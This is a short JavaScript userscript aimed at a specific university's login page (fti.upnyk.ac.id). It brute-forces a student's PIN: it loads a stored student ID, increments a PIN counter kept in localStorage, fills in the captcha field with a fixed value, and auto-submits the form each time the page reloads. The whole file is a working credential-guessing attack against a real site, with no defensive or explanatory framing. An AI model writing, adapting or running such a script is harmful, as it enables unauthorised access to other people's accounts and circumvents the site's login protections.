if (
  window.location.href == 'http://fti.upnyk.ac.id/login.html' ||
  window.location.href == 'http://fti.upnyk.ac.id/menu01.html?login=fail'
) {
  const PIN = 'PIN';
  const NIM = 'NIM';

  const nimEl = document.querySelector("input[name='user_id']");
  const pinEl = document.querySelector("input[name='pwd0']");
  const captcha = document.querySelector("input[name='fcaptcha']");
  const form = document.querySelector('form');

  const nim = localStorage.getItem(NIM);
  let pin = localStorage.getItem(PIN);
  if (!pin) pin = 0;

  if (nimEl) {
    pin++;

    nimEl.value = nim;
    captcha.value = 1;
    pinEl.value = pin;

    if (typeof Storage !== undefined) localStorage.setItem(PIN, pin);
    form.submit();
  }
}
